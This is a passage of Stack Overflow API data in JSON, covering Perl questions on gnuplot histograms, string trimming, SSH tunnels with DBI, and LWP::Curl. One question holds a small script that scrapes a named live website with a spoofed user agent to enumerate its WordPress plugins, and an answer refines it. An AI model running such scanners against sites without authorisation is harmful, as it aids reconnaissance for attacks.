necessary variables and put them in &quot;here document&quot;. It seems that this perl package has pretty poor capacities."}, {"owner": {"reputation": 483, "user_id": 4775890, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/26ba77b7e154380c4bd69a1c105eb160?s=128&d=identicon&r=PG&f=1", "display_name": "Angelos", "link": "https://stackoverflow.com/users/4775890/angelos"}, "edited": false, "score": 0, "creation_date": 1494920660, "post_id": 43966881, "comment_id": 75019153, "body": "I believe this feature is not supported yet, by Chart::Gnuplot;"}], "owner": {"reputation": 483, "user_id": 4775890, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/26ba77b7e154380c4bd69a1c105eb160?s=128&d=identicon&r=PG&f=1", "display_name": "Angelos", "link": "https://stackoverflow.com/users/4775890/angelos"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 753, "favorite_count": 0, "answer_count": 0, "score": 3, "last_activity_date": 1494787705, "creation_date": 1494782966, "last_edit_date": 1494787705, "question_id": 43966881, "link": "https://stackoverflow.com/questions/43966881/gnuplot-histogram-with-perl-how-to-put-values-on-top-of-bars", "title": "gnuplot histogram with Perl: How to put values on top of bars", "body": "<p>How can the following gnuplot plot can be generate using Perl ?\n(I need a histogram where under each bar I will write the difference between that column and the column on its right side, with the same data) </p>\n\n<p>The problem is that I didn't figure out how to put numbers under the bars, using Perl.</p>\n\n<p><a href=\"https://i.stack.imgur.com/vJBWA.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/vJBWA.png\" alt=\"enter image description here\"></a></p>\n\n<p>This is the code of gnuplot:</p>\n\n<pre><code>reset\n\nset terminal png \n\nset output 'StackOverflow.png'\n\nset style fill solid 1.00\n\nset style histogram clustered gap 1\n\nset style data histograms\n\nset yrange [0:120]\n\nset xtics norangelimit font \",8\"\n\nset ytics norangelimit font \",8\"\n\nset key font \",8\"\nset key width -8\n\nxoffset=0.17\nyoffset=0.03\n\nplot 'data.dat' using 2:xtic(1) with histogram title \"Parameter 1\", \\\n     '' u 3 with histogram title \"Parameter 2\", \\\n     '' u 0:2:4 with labels offset -0.9,0.5 title \"\", \\\n     '' u 0:3:5 with labels offset 2.0,0.5 title \"\"\n</code></pre>\n\n<p>Currently I have generated the following using Perl:\n<a href=\"https://i.stack.imgur.com/QBDFQ.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/QBDFQ.png\" alt=\"enter image description here\"></a></p>\n\n<p>And this is the Perl code:</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse Chart::Gnuplot;\n\nmy $chart = Chart::Gnuplot-&gt;new(\n    output =&gt; 'plotStyle_19.png',\n    yrange =&gt; [0, 120],\n    bg     =&gt; {\n        color   =&gt; \"#c9c9ff\",\n        density =&gt; 0.2,\n    },\n);\n\nmy @x = qw( A B C D );\nmy $h1 = Chart::Gnuplot::DataSet-&gt;new(\n    xdata =&gt; \\@x,\n    ydata =&gt; [99, 97, 97, 95],\n    title =&gt; \"1st data set\",\n    color =&gt; \"purple\",\n    fill  =&gt; {density =&gt; 0.2},\n    style =&gt; \"histograms\",\n);\n\nmy $h2 = Chart::Gnuplot::DataSet-&gt;new(\n    xdata =&gt; \\@x,\n    ydata =&gt; [9, 10, 13, 15],\n    title =&gt; \"2nd data set\",\n    color =&gt; \"dark-green\",\n    fill  =&gt; {density =&gt; 0.2},\n    style =&gt; \"histograms\",\n\n);\n\n$chart-&gt;plot2d($h1, $h2);\n</code></pre>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 997, "user_id": 2354319, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/f1ea1af443d922b09df749e51b4b0436?s=128&d=identicon&r=PG", "display_name": "Enric Agud Pique", "link": "https://stackoverflow.com/users/2354319/enric-agud-pique"}, "edited": false, "score": 0, "creation_date": 1494868210, "post_id": 43964307, "comment_id": 74999543, "body": "...@timrau thank you....another question... if the string is the name of a file, how can I save the new name? how can I change the name of the file in my folder? not only doing a print, also, I want to substr the character in the name of the file..."}], "tags": [], "owner": {"reputation": 21474, "user_id": 718379, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4810c6c963334e5dce573e6671d746ec?s=128&d=identicon&r=PG", "display_name": "timrau", "link": "https://stackoverflow.com/users/718379/timrau"}, "is_accepted": true, "score": 11, "last_activity_date": 1494767677, "creation_date": 1494767677, "answer_id": 43964307, "question_id": 43964295, "link": "https://stackoverflow.com/questions/43964295/remove-the-last-characters-of-a-string/43964307#43964307", "title": "Remove the last characters of a string", "body": "<p>Assume the string is <code>$s</code>. </p>\n\n<pre><code>$s = substr $s, 0, -6;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1494768185, "post_id": 43964356, "comment_id": 74958797, "body": "Or <code>substr($string, -6) = &quot;&quot;;</code>."}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 3, "last_activity_date": 1494768482, "last_edit_date": 1494768482, "creation_date": 1494768018, "answer_id": 43964356, "question_id": 43964295, "link": "https://stackoverflow.com/questions/43964295/remove-the-last-characters-of-a-string/43964356#43964356", "title": "Remove the last characters of a string", "body": "<p>You can use <code>substr</code>:</p>\n\n<pre><code>substr($string, -6) = \"\";\n# or\nsubstr $string, -6, length $string, \"\";\n</code></pre>\n\n<p>Or a substitution:</p>\n\n<pre><code>$string =~ s/.{6}$//;\n</code></pre>\n\n<p>Or <a href=\"http://p3rl.org/chop\" rel=\"nofollow noreferrer\">chop</a>:</p>\n\n<pre><code>chop $string for 1 .. 6;\n</code></pre>\n"}], "owner": {"reputation": 997, "user_id": 2354319, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/f1ea1af443d922b09df749e51b4b0436?s=128&d=identicon&r=PG", "display_name": "Enric Agud Pique", "link": "https://stackoverflow.com/users/2354319/enric-agud-pique"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 22407, "favorite_count": 1, "closed_date": 1494786373, "accepted_answer_id": 43964307, "answer_count": 2, "score": 1, "last_activity_date": 1494770706, "creation_date": 1494767569, "last_edit_date": 1494770706, "question_id": 43964295, "link": "https://stackoverflow.com/questions/43964295/remove-the-last-characters-of-a-string", "closed_reason": "Duplicate", "title": "Remove the last characters of a string", "body": "<p>How can I remove the last six characters of a string using Perl? In my case I need to remove <code>:00:00</code></p>\n\n<p>For example</p>\n\n<pre><code>goes_2017-05-14_00:00:00 \n</code></pre>\n\n<p>to get</p>\n\n<pre><code>goes_2017-05-14_\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 1, "creation_date": 1494756391, "post_id": 43962436, "comment_id": 74955630, "body": "Stackoverflow is no code writing service. It makes no sense to show the code which generates the problem you are trying to solve. Instead you should show what you&#39;ve tried to solve the problem, i.e.to detect a duplicate line. See for example <a href=\"https://stackoverflow.com/questions/5884401/perl-find-duplicate-lines-in-file-or-array\" title=\"perl find duplicate lines in file or array\">stackoverflow.com/questions/5884401/&hellip;</a> or just search for <a href=\"https://www.google.com/search?q=perl+find+duplicate+lines\" rel=\"nofollow noreferrer\">perl find duplicate line</a> for hints."}], "answers": [{"tags": [], "owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "is_accepted": true, "score": 0, "last_activity_date": 1494820018, "last_edit_date": 1494820018, "creation_date": 1494756390, "answer_id": 43962686, "question_id": 43962436, "link": "https://stackoverflow.com/questions/43962436/remove-duplicate-lines/43962686#43962686", "title": "Remove Duplicate Lines", "body": "<pre><code>my %seen; # Hash for counting number of occurrences\nwhile($karza =~m/\\/wp-content\\/plugins\\/(.*?)\\/(.*?)' type='text\\/css' media='all'/g)\n{ \n  $id=$1;\n  next if $seen{$id}++; # skip already seen ids\n  print \"[*] Plugins: $id \\n\";\n}\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 8009640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/86928f052161d9c5e469ee9d364ea1a8?s=128&d=identicon&r=PG&f=1", "display_name": "aymen nori", "link": "https://stackoverflow.com/users/8009640/aymen-nori"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 149, "favorite_count": 1, "accepted_answer_id": 43962686, "answer_count": 1, "score": -3, "last_activity_date": 1494820018, "creation_date": 1494754605, "last_edit_date": 1494763644, "question_id": 43962436, "link": "https://stackoverflow.com/questions/43962436/remove-duplicate-lines", "title": "Remove Duplicate Lines", "body": "<pre><code>#!/usr/bin/perl\n\nuse Term::ANSIColor;\nuse LWP::UserAgent;\nuse HTTP::Request;\nuse HTTP::Request;\nuse HTTP::Request::Common qw(POST);\n$ua = LWP::UserAgent-&gt;new(keep_alive =&gt; 1);\n$ua-&gt;agent(\"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)\");\n$ua-&gt;timeout (10);\n\nprint \"scan\\n\";\n$site=\"http://aubergelasolas.com\\n\";\n\n$sorm = $ua-&gt;get($site);\n$karza = $sorm-&gt;content;\nwhile($karza =~m/\\/wp-content\\/plugins\\/(.*?)\\/(.*?)' type='text\\/css' media='all'/g)\n{ \n$id=$1;\nprint \"[*] Plugins: $id \\n\";\n\n}\n</code></pre>\n\n<p>if run scrip font this rzlt\ni need to delete or hide duplication</p>\n\n<pre><code>perl k.pl\nscan\n[*] Plugins: google-language-translator\n[*] Plugins: jetpack\n[*] Plugins: our-team-enhanced\n[*] Plugins: wc-gallery\n[*] Plugins: wc-gallery\n[*] Plugins: wc-gallery\n[*] Plugins: wc-gallery\n[*] Plugins: wc-gallery\n[*] Plugins: tablepress\n</code></pre>\n\n<p>i need to remove only duplicate lines \ni need to delete or hide duplication\nand thnx </p>\n"}, {"tags": ["perl", "ssh-tunnel"], "answers": [{"comments": [{"owner": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "edited": false, "score": 0, "creation_date": 1494762726, "post_id": 43962351, "comment_id": 74957257, "body": "Thank you. What goes in the $dsn? Also, since I&#39;m not on Windows, I assume I use 3306 for the mysql port instead of 4022?"}, {"owner": {"reputation": 9262, "user_id": 124951, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/c46d5911a8fb4ffd5fb8523d56a60de0?s=128&d=identicon&r=PG", "display_name": "salva", "link": "https://stackoverflow.com/users/124951/salva"}, "reply_to_user": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "edited": false, "score": 0, "creation_date": 1494766574, "post_id": 43962351, "comment_id": 74958323, "body": "<code>$dsn</code> should point to the local side of the tunnel. I have included an example above for mysql."}, {"owner": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "edited": false, "score": 0, "creation_date": 1494777183, "post_id": 43962351, "comment_id": 74961765, "body": "Thanks. I will test this out as soon as I get a chance."}], "tags": [], "owner": {"reputation": 9262, "user_id": 124951, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/c46d5911a8fb4ffd5fb8523d56a60de0?s=128&d=identicon&r=PG", "display_name": "salva", "link": "https://stackoverflow.com/users/124951/salva"}, "is_accepted": true, "score": 6, "last_activity_date": 1494766476, "last_edit_date": 1494766476, "creation_date": 1494754077, "answer_id": 43962351, "question_id": 43960119, "link": "https://stackoverflow.com/questions/43960119/best-way-to-prevent-mux-client-request-session-read-from-master-failed-broken/43962351#43962351", "title": "Best way to prevent &quot;mux_client_request_session: read from master failed: Broken pipe&quot; ssh errors", "body": "<p>There is a race condition in your code: <code>spawn</code> runs the <code>ssh</code> command that starts the tunnel on the background, sometimes that command is faster than DBI <code>connect</code> starting the TCP socket, sometimes it isn't and so <code>connect</code> fails.</p>\n\n<p>Anyway, the way I usually recommend to create tunnels is to use a control command:</p>\n\n<pre><code> $ssh-&gt;system({ssh_opts =&gt; [-O =&gt; 'forward', '-L3066:localhost:3066']})\n</code></pre>\n\n<p>If you want to remove the tunnel once the connection to the database has been established:</p>\n\n<pre><code> $ssh-&gt;system({ssh_opts =&gt; [-O =&gt; 'cancel', '-L3066:localhost:3066']});\n</code></pre>\n\n<p>Also, note that you have to keep the <code>Net::OpenSSH</code> object alive as long as you want to use the DB connection.</p>\n\n<p>In summary:</p>\n\n<pre><code>sub dbi_connect {\n    my $mysql_port = 3066;\n    my $local_port = 12345;\n    my $dsn = \"DBI:mysql:database=$database;host=localhost;port=$local_port\";\n    my $tunnel = join ':', $local_port, 'localhost', $mysql_port;\n    my $ssh = Net::OpenSSH-&gt;new($host, ...);\n    $ssh-&gt;system({ssh_opts =&gt; [-O =&gt; 'forward', \"-L$tunnel\"]});\n    my $dbi = DBI-&gt;connect($dsn, $db_user, $db_pass);\n    $ssh-&gt;system({ssh_opts =&gt; [-O =&gt; 'cancel', \"-L$tunnel\"]});\n    return ($dbi, $ssh);\n}\n</code></pre>\n\n<p>See also <a href=\"http://perlmonks.org/?node_id=1189875\" rel=\"noreferrer\">this post</a> at PerlMonks.</p>\n"}], "owner": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 7552, "favorite_count": 3, "accepted_answer_id": 43962351, "answer_count": 1, "score": 4, "last_activity_date": 1494766476, "creation_date": 1494732792, "question_id": 43960119, "link": "https://stackoverflow.com/questions/43960119/best-way-to-prevent-mux-client-request-session-read-from-master-failed-broken", "title": "Best way to prevent &quot;mux_client_request_session: read from master failed: Broken pipe&quot; ssh errors", "body": "<p>I've got a perl script that creates an ssh tunnel and sets up a Perl DBI connection across it to query a database on a remote host:</p>\n\n<pre><code>1 my $ssh = Net::OpenSSH-&gt;new('me@host.com');\n2 $pid = $ssh-&gt;spawn({ssh_opts =&gt; '-L 127.0.0.1:12345:127.0.0.1:3306'}, 'sleep 3');\n\n3 return DBI-&gt;connect($dsn, $db_user, $db_pass);\n</code></pre>\n\n<p>This works about 80 to 90% of the time but the rest of the time I get this error when trying to connect to the database:</p>\n\n<blockquote>\n  <p>mux_client_request_session: read from master failed: Broken pipe</p>\n</blockquote>\n\n<p>In the process of troubleshooting this, I noticed if I sleep the program very briefly after line 2 with <code>usleep (10000)</code>, it works 100% of the time. I'm not sure why this is but I'm curious know and how I can properly fix the issue.</p>\n\n<p>Thanks.</p>\n"}, {"tags": ["perl", "curl"], "comments": [{"owner": {"reputation": 15906, "user_id": 3527940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k1R45.jpg?s=128&g=1", "display_name": "jcaron", "link": "https://stackoverflow.com/users/3527940/jcaron"}, "edited": false, "score": 3, "creation_date": 1494708859, "post_id": 43957827, "comment_id": 74946671, "body": "I think you have too many different questions here..."}, {"owner": {"reputation": 403, "user_id": 7349485, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lzfEj.jpg?s=128&g=1", "display_name": "carlosn", "link": "https://stackoverflow.com/users/7349485/carlosn"}, "edited": false, "score": 0, "creation_date": 1494709036, "post_id": 43957827, "comment_id": 74946734, "body": "Do you have LWP::Curl installed?"}, {"owner": {"reputation": 1, "user_id": 8008256, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8a4259c2ef9f86b21c85e8507428005d?s=128&d=identicon&r=PG&f=1", "display_name": "sasen7", "link": "https://stackoverflow.com/users/8008256/sasen7"}, "reply_to_user": {"reputation": 403, "user_id": 7349485, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lzfEj.jpg?s=128&g=1", "display_name": "carlosn", "link": "https://stackoverflow.com/users/7349485/carlosn"}, "edited": false, "score": 0, "creation_date": 1494710498, "post_id": 43957827, "comment_id": 74947076, "body": "Hi @carlosn, we have not installed LWP::Curl module under perl. We have separately installed cURL on our server.  When I type the below comands I get the following info <code>perl -MLWP -le &quot;print(LWP-&gt;VERSION)&quot;</code> <b>5.69</b>  <code>perldoc -l LWP::Curl</code> <b>No documentation found for &quot;LWP::Curl&quot;.</b>"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494711139, "post_id": 43957827, "comment_id": 74947260, "body": "If you have curl, you can always shell out and call it directly. But why do you need curl? Can you not work with LWP::UserAgent or Net::FTP (or derivates)?"}, {"owner": {"reputation": 1, "user_id": 8008256, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8a4259c2ef9f86b21c85e8507428005d?s=128&d=identicon&r=PG&f=1", "display_name": "sasen7", "link": "https://stackoverflow.com/users/8008256/sasen7"}, "reply_to_user": {"reputation": 15906, "user_id": 3527940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k1R45.jpg?s=128&g=1", "display_name": "jcaron", "link": "https://stackoverflow.com/users/3527940/jcaron"}, "edited": false, "score": 0, "creation_date": 1494711265, "post_id": 43957827, "comment_id": 74947285, "body": "Hi @jcaron, sorry just wanted to give a background of what I am trying to do.  &lt;br/&gt; I am trying to call cURL using perl script and it is not working.  &lt;br/&gt; We have perl and cURL installed on our server, however would like to know if we need any additional perl modules to use cURL??"}, {"owner": {"reputation": 15906, "user_id": 3527940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k1R45.jpg?s=128&g=1", "display_name": "jcaron", "link": "https://stackoverflow.com/users/3527940/jcaron"}, "edited": false, "score": 0, "creation_date": 1494713546, "post_id": 43957827, "comment_id": 74947911, "body": "As pointed out by others, you need to have the module installed if you want to use it, though if you want to use curl I would rather recommend the WWW::Curl module. Or indeed the standard LWP which does not use curl."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1494716218, "post_id": 43957827, "comment_id": 74948508, "body": "LWP != LWP::Curl. <code>perl -MLWP::Curl -le&#39;print LWP::Curl-&gt;VERSION&#39;</code> and <code>perldoc -lm LWP::Curl</code>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 15906, "user_id": 3527940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k1R45.jpg?s=128&g=1", "display_name": "jcaron", "link": "https://stackoverflow.com/users/3527940/jcaron"}, "edited": false, "score": 0, "creation_date": 1494716505, "post_id": 43957827, "comment_id": 74948562, "body": "@jcaron: It appears that standard <code>LWP</code> doesn&#39;t support FTPS."}, {"owner": {"reputation": 1, "user_id": 8008256, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8a4259c2ef9f86b21c85e8507428005d?s=128&d=identicon&r=PG&f=1", "display_name": "sasen7", "link": "https://stackoverflow.com/users/8008256/sasen7"}, "reply_to_user": {"reputation": 15906, "user_id": 3527940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k1R45.jpg?s=128&g=1", "display_name": "jcaron", "link": "https://stackoverflow.com/users/3527940/jcaron"}, "edited": false, "score": 0, "creation_date": 1494754341, "post_id": 43957827, "comment_id": 74955120, "body": "@jcaron thank you for your commment and suggestion, I have understood and will get LWP::Curl installed Cheers!"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 8008256, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8a4259c2ef9f86b21c85e8507428005d?s=128&d=identicon&r=PG&f=1", "display_name": "sasen7", "link": "https://stackoverflow.com/users/8008256/sasen7"}, "edited": false, "score": 0, "creation_date": 1494754404, "post_id": 43958502, "comment_id": 74955133, "body": "Many thanks for your suggestion. Appreciate the detail info you have shared. It is clear now and undesrtood what is missing. I will get the LWP::Curl module installed. Cheers!"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1494751433, "last_edit_date": 1494751433, "creation_date": 1494713902, "answer_id": 43958502, "question_id": 43957827, "link": "https://stackoverflow.com/questions/43957827/unable-to-call-curl-from-perl-in-unix/43958502#43958502", "title": "Unable to call cURL from perl in Unix", "body": "<ul>\n<li><p>The <code>LWP::Curl</code> module needs to be installed</p>\n\n<p>It doesn't require <code>libcurl.pm</code> or <code>curl.pm</code>; indeed, there are no such modules</p>\n\n<p>It <em>does</em> require <code>WWW::Curl::Easy</code>, but that will ordinarily be installed automatically when you install <code>LWP::Curl</code></p></li>\n<li><p>There are very many <code>WWW</code> modules and I can't tell which one you mean</p>\n\n<p>I would normally recommend the regular <code>LWP</code> as it is the \"standard\" way of writing an internet client, but I don't believe it supports FTPS, so  <code>LWP::Curl</code> should do fine</p></li>\n<li><p>To install the <code>LWP::Curl</code> Perl library, you need to have <code>libcurl</code> and the C header files on your system. The <code>WWW::Curl::Easy</code> module will build against those, and the build will fail if you don't have them</p>\n\n<p>That is all you need</p></li>\n</ul>\n\n<p><br/></p>\n\n<p>You may want to consider <code>LWP::Protocol::Net::Curl</code>, which is very similar to <code>LWP::Curl</code> but it is a completely separate module by a different author and with different dependencies. It hasn't been updated as recently as <code>LWP::Curl</code>, but it is designed and tested as another <code>LWP:;Protocol</code> plug-in which can replace the standard protocols leaving  <code>LWP</code> to work as normal. <code>LWP::Curl</code> doesn't seem to be quite as compatible</p>\n"}], "owner": {"reputation": 1, "user_id": 8008256, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8a4259c2ef9f86b21c85e8507428005d?s=128&d=identicon&r=PG&f=1", "display_name": "sasen7", "link": "https://stackoverflow.com/users/8008256/sasen7"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 301, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1494751433, "creation_date": 1494708317, "last_edit_date": 1494712609, "question_id": 43957827, "link": "https://stackoverflow.com/questions/43957827/unable-to-call-curl-from-perl-in-unix", "title": "Unable to call cURL from perl in Unix", "body": "<p>My project wants to download files on <strong>Unix AIX</strong> from the <strong>AWS</strong> platform. I am trying to call cURL from within Perl script to server this purpose. </p>\n\n<p>I am getting an error</p>\n\n<blockquote>\n  <p>Can't locate LWP/Curl.pm in @INC. Haven't been able to find libcurl.pm and curl.pm in respective directory of perl installation.</p>\n</blockquote>\n\n<p>The version of Perl being used here is 5.8.8. I have read about this error and found that it requires <code>libcurl.pm</code> (7.10.8 version) and <code>curl.pm</code> modules installed in Perl's module library.</p>\n\n<p>Going forward there is a plan to use cURL in combination with FTPS in order to download files from AWS. I have also read WWW library should be used instead of LWP from <code>cpan.search.org</code>. Can you advise which is better?</p>\n\n<p>Also, if you could list the prerequisites of using cURL from within Perl script please?</p>\n"}, {"tags": ["perl", "version"], "comments": [{"owner": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 2, "creation_date": 1494700283, "post_id": 43956440, "comment_id": 74944226, "body": "Add <code>use feature &#39;say&#39;;</code> in your script and then <code>perlver script_name.pl</code> will show the min version <b>v5.10.0</b>, I used your exact syntax and got the same error and @ikegami is right."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1494701243, "post_id": 43956440, "comment_id": 74944543, "body": "<i>&quot; But when I add use v5.8.0 to the script, I get an error:&quot;</i> You get an error even without <code>use v5.8.0</code>. That code won&#39;t compile under any existing version of Perl. You can&#39;t just throw nonsense at the utility and hope to get a sensible answer."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494701308, "post_id": 43956440, "comment_id": 74944562, "body": "There are hardly any functions that have been added outside of features over time. The only one I know ottomh is <code>fc</code>, but I am not sure about that. There are some operators, like <code>&#47;&#47;=</code>, that have been added later and those don&#39;t need <code>feature</code>s."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494701468, "post_id": 43956440, "comment_id": 74944618, "body": "Is exercise 6 from a book, a tutorial or is it part of a class in school/university? Just curious. I&#39;ve never seen a tutorial that bothers with the version of Perl, especially not early on. Most of the things are version-agnostic. Perl 5 is very good with not caring about the version you have. Backwards-compatibility is a big issue in the Perl core and on CPAN. That&#39;s why new syntax doesn&#39;t just appear, it needs to be turned on explicitly. That&#39;s what the <code>use version</code> pragma is all about."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494701511, "post_id": 43956440, "comment_id": 74944628, "body": "@simbabque: <code>fc</code> requires <code>use feature &#39;fc&#39;</code>. Where did you get &quot;exercise 6&quot; from?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 2, "creation_date": 1494701838, "post_id": 43956440, "comment_id": 74944740, "body": "@Borodin haha. Right. Proves my point though. :-) The file name is ex6-1.pl, which sounds a lot like exercise 6. And they have been told stuff. That sounds like a class. Actually I think the question is not bad. It&#39;s valid. And they don&#39;t know a lot about the language yet. True, they ought have run the program first to see if it works, but still."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1494715408, "post_id": 43956440, "comment_id": 74948333, "body": "Re &quot;<i>I was told Perl comes with a program called <code>perlver</code></i>&quot;, It&#39;s actually provided by the Perl-MinimumVersion distribution."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": 